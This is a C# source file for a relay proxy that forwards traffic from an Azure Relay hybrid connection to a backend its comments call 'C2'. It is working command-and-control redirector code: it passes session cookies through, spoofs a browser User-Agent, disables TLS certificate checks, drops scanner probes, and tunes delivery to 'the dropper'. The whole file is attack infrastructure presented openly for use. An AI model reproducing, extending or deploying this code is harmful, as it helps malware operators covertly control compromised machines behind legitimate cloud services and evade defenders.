using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.WebSockets;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

class Program
{
    static string RelayNamespace = "";
    static string ConnectionName = "";
    static string KeyName        = "RootManageSharedAccessKey";
    static string Key            = "";
    static string TargetHost     = "";
    const  string DefaultUA      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36";

    static async Task Main(string[] args)
    {
        for (int i = 0; i < args.Length - 1; i++)
        {
            switch (args[i].ToLower())
            {
                case "-namespace": RelayNamespace = args[++i]; break;
                case "-connection": ConnectionName = args[++i]; break;
                case "-key":       Key            = args[++i]; break;
                case "-target":    TargetHost     = args[++i]; break;
                default:
                    Console.WriteLine($"Unknown arg: {args[i]}");
                    Console.WriteLine("Usage: RelayProxy.exe [-namespace <ns>] [-connection <name>] [-key <key>] [-target <host>]");
                    return;
            }
        }

        Console.WriteLine($"[RELAY] Connecting to {RelayNamespace}/{ConnectionName}...");
        while (true)
        {
            try { await RunControlChannel(); }
            catch (Exception ex) { Console.WriteLine($"[ERROR] Control: {ex.Message} — reconnecting in 3s"); }
            await Task.Delay(3000);
        }
    }

    static async Task RunControlChannel()
    {
        var token      = GenerateSasToken($"http://{RelayNamespace}/{ConnectionName}", Key);
        var controlUri = new Uri($"wss://{RelayNamespace}/$hc/{ConnectionName}?sb-hc-action=listen&sb-hc-token={Uri.EscapeDataString(token)}");

        using var ws = new ClientWebSocket();
        await ws.ConnectAsync(controlUri, CancellationToken.None);
        Console.WriteLine("[RELAY] Control channel open");

        var buf = new byte[65536];
        while (ws.State == WebSocketState.Open)
        {
            // Read next frame — could be TEXT (request JSON) or BINARY (POST body following a body=true request)
            var result = await ws.ReceiveAsync(buf, CancellationToken.None);
            if (result.MessageType == WebSocketMessageType.Close) break;
            if (result.MessageType != WebSocketMessageType.Text) continue;

            // Reassemble multi-frame TEXT message
            var sb = new StringBuilder();
            sb.Append(Encoding.UTF8.GetString(buf, 0, result.Count));
            while (!result.EndOfMessage)
            {
                result = await ws.ReceiveAsync(buf, CancellationToken.None);
                if (result.MessageType == WebSocketMessageType.Text)
                    sb.Append(Encoding.UTF8.GetString(buf, 0, result.Count));
            }

            // Log every raw control-channel JSON so we can see what Azure Relay sends for large POSTs
            var rawCtrl = sb.ToString();
            Console.WriteLine($"[CTRL] {rawCtrl.Substring(0, Math.Min(400, rawCtrl.Length))}");

            var doc = JsonDocument.Parse(rawCtrl).RootElement;
            if (!doc.TryGetProperty("request", out var request)) continue;

            var rendezvousUrl = request.GetProperty("address").GetString();

            // Control message "id" field (includes _V suffix) is the requestId for the response
            var requestId = request.TryGetProperty("id", out var idProp) ? idProp.GetString() : null;
            if (requestId == null && rendezvousUrl != null)
                requestId = ExtractQueryParam(rendezvousUrl, "sb-hc-id");

            var method  = request.TryGetProperty("method",        out var mProp) ? mProp.GetString()  : null;
            var path    = request.TryGetProperty("requestTarget", out var tProp) ? tProp.GetString()  : null;
            // When method/requestTarget are absent from the control JSON, Azure Relay delivers the
            // FULL raw HTTP request (request line + headers + body) as binary frames on the rendezvous.
            // body=true  → small POST ≤64KB, body as binary frame(s) on control channel
            // body=false → GET (no body), or POST where body is on rendezvous
            // body absent + method absent → large POST >64KB, full raw HTTP on rendezvous
            bool bodyPropertyPresent = request.TryGetProperty("body", out var bProp);
            bool hasBody    = bodyPropertyPresent && bProp.GetBoolean();
            bool isPost     = method != null && !method.Equals("GET", StringComparison.OrdinalIgnoreCase);
            bool rawHttp    = method == null;          // full raw HTTP on rendezvous — parse it there
            bool largeBody  = rawHttp || (isPost && !hasBody);
            var hdrs = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            if (request.TryGetProperty("requestHeaders", out var rh))
                foreach (var h in rh.EnumerateObject())
                    hdrs[h.Name] = h.Value.GetString() ?? "";

            // Small POST: body arrives as binary frame(s) immediately after the JSON on the control channel
            byte[] postBody = Array.Empty<byte>();
            if (hasBody)
            {
                var bodyList = new List<byte>();
                do
                {
                    result = await ws.ReceiveAsync(buf, CancellationToken.None);
                    if (result.MessageType == WebSocketMessageType.Binary)
                        bodyList.AddRange(buf[..result.Count]);
                } while (!result.EndOfMessage);
                postBody = bodyList.ToArray();
                int encLen = postBody.Length > 1500 ? postBody.Length - 1500 : postBody.Length;
                Console.WriteLine($"[DEBUG] POST body from control channel: {postBody.Length} bytes (image=1500, encrypted={encLen})");
            }

            Console.WriteLine($"[RELAY] {method ?? "RAW"} {path ?? "(raw)"}  id={requestId}  body={hasBody} large={largeBody} raw={rawHttp} ({postBody.Length}B)");
            _ = Task.Run(() => HandleRendezvous(rendezvousUrl, requestId, method ?? "POST", path ?? "/", postBody, hdrs, largeBody, rawHttp));
        }
    }

    static async Task HandleRendezvous(string? rendezvousUrl, string? requestId, string method, string path,
                                        byte[] postBody, Dictionary<string, string> hdrs, bool largeBody = false,
                                        bool rawHttp = false)
    {
        if (rendezvousUrl == null) return;
        string? tempBodyFile = null;
        using var ws = new ClientWebSocket();
        try
        {
            await ws.ConnectAsync(new Uri(rendezvousUrl), CancellationToken.None);
            Console.WriteLine("[DEBUG] Rendezvous connected");
            RenzvBodyContent? streamingBody = null;

            // largeBody / rawHttp: Azure Relay rendezvous protocol for large requests:
            //   WS message 1 — TEXT frame: full JSON with method, requestTarget, requestHeaders, id, body flag
            //   WS message 2+ — BINARY frames: request body bytes (only if body=true in JSON)
            // The control channel JSON is stripped for rawHttp (>64KB request); the rendezvous JSON
            // always has the complete metadata.  requestId with _V suffix also comes from here.
            if (largeBody || rawHttp)
            {
                // Read the JSON metadata frame (arrives immediately after WS connect — no timeout needed)
                var buf128 = new byte[131072];
                var jsonAccum = new List<byte>();
                WebSocketReceiveResult jr;
                do
                {
                    jr = await ws.ReceiveAsync(buf128, CancellationToken.None);
                    if (jr.MessageType == WebSocketMessageType.Binary || jr.MessageType == WebSocketMessageType.Text)
                        jsonAccum.AddRange(buf128[..jr.Count]);
                    else if (jr.MessageType == WebSocketMessageType.Close)
                        return;
                } while (!jr.EndOfMessage);

                var jsonText = Encoding.UTF8.GetString(jsonAccum.ToArray());
                Console.WriteLine($"[DEBUG] Rendezvous JSON: {jsonText.Substring(0, Math.Min(400, jsonText.Length))}");

                bool bodyOnRendezvous = false;
                try
                {
                    var rdoc = JsonDocument.Parse(jsonText).RootElement;
                    if (rdoc.TryGetProperty("request", out var rreq))
                    {
                        // id field on rendezvous has _V suffix (may be absent on control channel for rawHttp)
                        if (rreq.TryGetProperty("id",            out var rId)  && rId.GetString()  is string rid) requestId = rid;
                        if (rreq.TryGetProperty("method",        out var rMth) && rMth.GetString() is string rm)  method    = rm;
                        if (rreq.TryGetProperty("requestTarget", out var rTgt) && rTgt.GetString() is string rt)  path      = rt;
                        if (rreq.TryGetProperty("requestHeaders", out var rHdr))
                            foreach (var h in rHdr.EnumerateObject())
                                hdrs[h.Name] = h.Value.GetString() ?? "";
                        bodyOnRendezvous = rreq.TryGetProperty("body", out var rBody) && rBody.GetBoolean();
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[DEBUG] Rendezvous JSON parse error: {ex.Message}");
                }

                if (bodyOnRendezvous)
                {
                    // Drain all WS binary frames to a temp file so we know the exact size
                    // and can send Content-Length to C2. Python's BaseHTTPServer reads
                    // self.rfile.read(content_length) — without Content-Length it reads 0 bytes.
                    tempBodyFile = await DrainRendezvousBodyToFile(ws);
                    var fileLen = new FileInfo(tempBodyFile).Length;
                    streamingBody = new RenzvBodyContent(tempBodyFile, fileLen);
                    Console.WriteLine($"[DEBUG] Large body: {fileLen}B drained to {tempBodyFile}");
                }

                var cookieVal = hdrs.ContainsKey("Cookie") ? hdrs["Cookie"] : null;
                Console.WriteLine($"[DEBUG] Cookie: {(cookieVal != null ? cookieVal.Substring(0, Math.Min(100, cookieVal.Length)) + (cookieVal.Length > 100 ? "..." : "") : "(not found)")}");
                Console.WriteLine($"[DEBUG] rendezvous: method={method} path={path} bodyOnRendezvous={bodyOnRendezvous} controlBody={postBody.Length}B");
            }
            // Small POST body already in postBody from control channel; GET has no body.

            // Drop bare root requests (Azure Relay probes, scanners) — after raw HTTP parse so the
            // real path is known; rawHttp requests always have a real path, never a bare probe.
            if (path == "/" && !rawHttp)
            {
                Console.WriteLine("[RELAY] Dropping bare root request");
                var dropJson = JsonSerializer.Serialize(new { response = new { requestId, statusCode = 404, statusDescription = "Not Found", responseHeaders = new Dictionary<string, string> { ["content-type"] = "text/plain" }, body = false } });
                await ws.SendAsync(Encoding.UTF8.GetBytes(dropJson), WebSocketMessageType.Text, true, CancellationToken.None);
                await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "NormalClosure", CancellationToken.None);
                return;
            }

            // Strip relay connection-name prefix from path
            var prefix = "/" + ConnectionName;
            if (path.StartsWith(prefix + "/") || path == prefix)
                path = path[prefix.Length..];
            if (string.IsNullOrEmpty(path)) path = "/";

            // Forward to backend
            // UseCookies=false: with the default (true) .NET's CookieContainer intercepts the
            // manually-set Cookie header and strips it — the C2 receives no session cookie.
            using var handler = new HttpClientHandler { ServerCertificateCustomValidationCallback = (m, c, ch, e) => true, UseCookies = false };
            using var http    = new HttpClient(handler) { Timeout = streamingBody != null ? TimeSpan.FromMinutes(30) : TimeSpan.FromSeconds(30) };
            if (hdrs.TryGetValue("Cookie", out var cookie))
            {
                http.DefaultRequestHeaders.TryAddWithoutValidation("Cookie", cookie);
                Console.WriteLine($"[DEBUG] Forwarding Cookie: {cookie.Substring(0, Math.Min(100, cookie.Length))}{(cookie.Length > 100 ? "..." : "")}");
            }
            else Console.WriteLine("[DEBUG] No Cookie in hdrs — C2 will reject POST");
            var ua = hdrs.TryGetValue("User-Agent", out var incomingUa) ? incomingUa : DefaultUA;
            http.DefaultRequestHeaders.TryAddWithoutValidation("User-Agent", ua);

            HttpResponseMessage resp;
            if (method.Equals("POST", StringComparison.OrdinalIgnoreCase))
            {
                HttpContent content = streamingBody ?? (HttpContent)new ByteArrayContent(postBody);
                resp = await http.PostAsync($"https://{TargetHost}{path}", content);
            }
            else
                resp = await http.GetAsync($"https://{TargetHost}{path}");

            // Log C2 response headers to diagnose truncation (e.g. C2 Content-Length mismatch)
            var c2ContentLength = resp.Content.Headers.ContentLength;
            var c2TransferEnc   = resp.Headers.TransferEncodingChunked == true ? "chunked" : "none";
            Console.WriteLine($"[DEBUG] C2 headers: Content-Length={c2ContentLength?.ToString() ?? "none"} Transfer-Encoding={c2TransferEnc}");

            // Use CopyToAsync into a MemoryStream to read ALL bytes regardless of Content-Length header.
            // ReadAsByteArrayAsync honours a Content-Length from C2 and stops early if C2 sends a wrong
            // (too-small) value, silently truncating the body that Apache2 would read to connection-close.
            var ms = new System.IO.MemoryStream();
            await resp.Content.CopyToAsync(ms);
            var respBody = ms.ToArray();

            var ct = resp.Content.Headers.ContentType?.MediaType ?? "application/octet-stream";
            Console.WriteLine($"[RELAY] → {(int)resp.StatusCode} {ct} ({respBody.Length} bytes, C2 said {c2ContentLength?.ToString() ?? "none"})");
            if (c2ContentLength.HasValue && c2ContentLength.Value != respBody.Length)
                Console.WriteLine($"[WARN] C2 Content-Length {c2ContentLength.Value} != actual body {respBody.Length} — C2 sent wrong length, we deliver all {respBody.Length} bytes");

            // TEXT frame: JSON response command (MUST be the first frame).
            // "body" field is required (IsRequired=true in the SDK DataContract).
            // RFC7230 headers (content-length, transfer-encoding) must NOT be in responseHeaders.
            var hasResponseBody = respBody.Length > 0;
            var respJson = JsonSerializer.Serialize(new
            {
                response = new
                {
                    requestId,
                    statusCode        = (int)resp.StatusCode,
                    statusDescription = resp.ReasonPhrase ?? "OK",
                    responseHeaders   = new Dictionary<string, string>
                    {
                        ["content-type"]   = ct,
                        ["content-length"] = respBody.Length.ToString()
                    },
                    body = hasResponseBody
                }
            });
            Console.WriteLine($"[DEBUG] Sending: {respJson}");
            await ws.SendAsync(Encoding.UTF8.GetBytes(respJson), WebSocketMessageType.Text, true, CancellationToken.None);

            // Single binary frame: send entire body as one endOfMessage=true frame.
            // Azure Relay streams each WS frame as a separate HTTP chunk; fragmented frames
            // (endOfMessage=false) can cause WinINet on the dropper to close early and only
            // deliver the first chunk. A single complete frame avoids this.
            if (hasResponseBody)
            {
                await ws.SendAsync(respBody, WebSocketMessageType.Binary, true, CancellationToken.None);
                Console.WriteLine($"[DEBUG] Sent {respBody.Length}B (single frame)");
            }

            // Brief pause before WS CLOSE so Azure Relay has time to flush buffered frames to the dropper.
            await Task.Delay(150);

            // Full WS CLOSE: relay forwards response to dropper only after we close the rendezvous
            await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "NormalClosure", CancellationToken.None);
            Console.WriteLine($"[DEBUG] Response sent + WS CLOSE, state={ws.State}");

        }
        catch (Exception ex)
        {
            Console.WriteLine($"[ERROR] Rendezvous: {ex.Message}");
        }
        finally
        {
            if (tempBodyFile != null) try { File.Delete(tempBodyFile); } catch { }
        }
    }

    static async Task<string> DrainRendezvousBodyToFile(ClientWebSocket ws)
    {
        var path = Path.Combine(Path.GetTempPath(), $"relay_{Guid.NewGuid():N}.bin");
        using var fs = File.Create(path);
        var buf  = new byte[131072];
        bool done = false;
        long total = 0;
        while (!done && ws.State == WebSocketState.Open)
        {
            using var idleCts = new CancellationTokenSource(2000);
            try
            {
                WebSocketReceiveResult br;
                do
                {
                    br = await ws.ReceiveAsync(buf, idleCts.Token);
                    if (br.MessageType == WebSocketMessageType.Binary)
                    {
                        await fs.WriteAsync(buf.AsMemory(0, br.Count));
                        total += br.Count;
                    }
                    else if (br.MessageType == WebSocketMessageType.Close)
                    {
                        done = true;
                        break;
                    }
                } while (!br.EndOfMessage && !done);
            }
            catch (OperationCanceledException) { done = true; }
        }
        Console.WriteLine($"[DEBUG] Body drain complete: {total}B");
        return path;
    }

    static string? ExtractQueryParam(string url, string name)
    {
        foreach (var part in url.Split('?', 2)[^1].Split('&'))
        {
            var kv = part.Split('=', 2);
            if (kv.Length == 2 && kv[0] == name) return Uri.UnescapeDataString(kv[1]);
        }
        return null;
    }

    static async Task<string?> ReceiveTextMessage(ClientWebSocket ws)
    {
        var buf = new byte[65536];
        var sb  = new StringBuilder();
        WebSocketReceiveResult result;
        do
        {
            result = await ws.ReceiveAsync(buf, CancellationToken.None);
            if (result.MessageType == WebSocketMessageType.Close) return null;
            if (result.MessageType == WebSocketMessageType.Text)
                sb.Append(Encoding.UTF8.GetString(buf, 0, result.Count));
        } while (!result.EndOfMessage);
        return sb.ToString();
    }

    static string GenerateSasToken(string resourceUri, string key)
    {
        var encoded = Uri.EscapeDataString(resourceUri);
        var expiry  = (long)(DateTime.UtcNow - new DateTime(1970,1,1)).TotalSeconds + 3600;
        var toSign  = $"{encoded}\n{expiry}";
        using var hmac = new HMACSHA256(Encoding.UTF8.GetBytes(key));
        var sig = Convert.ToBase64String(hmac.ComputeHash(Encoding.UTF8.GetBytes(toSign)));
        return $"SharedAccessSignature sr={encoded}&sig={Uri.EscapeDataString(sig)}&se={expiry}&skn={KeyName}";
    }
}

// Wraps a pre-drained temp file as an HttpContent so the POST to C2 includes an exact Content-Length.
// Python's BaseHTTPServer reads self.rfile.read(content_length) — without Content-Length it reads 0 bytes,
// causing a 502. Azure Relay strips Content-Length from rendezvous headers, so we drain to disk first,
// then POST the file with its known size. Temp file cleanup is handled by the caller's finally block.
class RenzvBodyContent : HttpContent
{
    private readonly string _filePath;
    private readonly long   _length;

    public RenzvBodyContent(string filePath, long length)
    {
        _filePath = filePath;
        _length   = length;
    }

    protected override async Task SerializeToStreamAsync(Stream stream, TransportContext? context)
    {
        using var fs = File.OpenRead(_filePath);
        await fs.CopyToAsync(stream);
    }

    protected override bool TryComputeLength(out long length)
    {
        length = _length;
        return true;
    }
}
